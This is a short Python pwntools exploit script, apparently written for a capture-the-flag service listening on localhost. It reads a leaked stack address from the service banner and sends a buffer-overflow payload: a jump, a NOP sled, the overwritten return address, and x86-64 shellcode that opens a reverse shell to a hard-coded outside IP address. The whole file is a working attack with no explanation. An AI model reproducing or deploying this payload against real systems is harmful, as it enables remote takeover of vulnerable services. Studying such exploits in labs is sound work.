#!/usr/bin/python

from pwn import *

line=[]

nulls = "\x00"
jmp = "\xe9\x53\x00\x00\x00"	# jmp 79 bytes forward
nops = "\x90" * (72 - len(nulls+jmp))
pad = "\x00" * 8
buf =  ""
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x48\xb9\x02\x00\x00\x50\x36\x41\x05\x5a\x51\x48"
buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# open the tcp connection and receive the banner
conn = remote('localhost', 4000)
sushihello = conn.recvline()

# parse the stack address
line = sushihello.split()
addr = line[5].replace("0x","")

# Reverse the byte order of the addresses 
little = "".join(reversed([addr[i:i+2] for i in range(0, len(addr), 2)]))

# convert the addresses to binary
data = little.decode('hex')

# build payload
attackstring = jmp + nops + nulls + data + nulls + nulls + pad + buf

print sushihello
print "Address: 0x" +  addr
print "Length of attack: " + str(len(attackstring))

# send the payload
conn.send(attackstring)
sleep(3)
conn.close()
